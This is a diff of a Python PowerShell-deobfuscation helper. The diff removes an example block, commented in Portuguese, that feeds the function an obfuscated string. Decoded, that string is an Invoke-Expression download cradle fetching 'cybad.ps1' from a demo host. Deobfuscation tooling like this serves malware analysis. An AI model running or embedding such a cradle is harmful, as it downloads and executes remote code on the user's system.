@@ -52,8 +52,3 @@ def deobfuscate(s: str, max_iters=20) -> str:
     if s.startswith("'") and s.endswith("'") and s.count("'") == 2:
         s = s[1:-1]
     return s.strip()
-
-# Exemplo com a string que você enviou (normalizei aspas no exemplo):
-obf = r"""&(" {1}{0}" -f 'EX','I')(&("{1}{0}{2}"-f 'Obje','New-','ct') ("{1}{4}{3}{0}{2}" -f'Clie','N','nt','t.Web','e')).("{1}{3}{0}{2}" -f 'trin','Downl','g','oadS').Invoke(("{1}{5}{2}{4}{3}{0}" -f 'l/cybad.ps1','h','ww','loca','w.demo.','ttp://'))"""
-
-print(deobfuscate(obf))
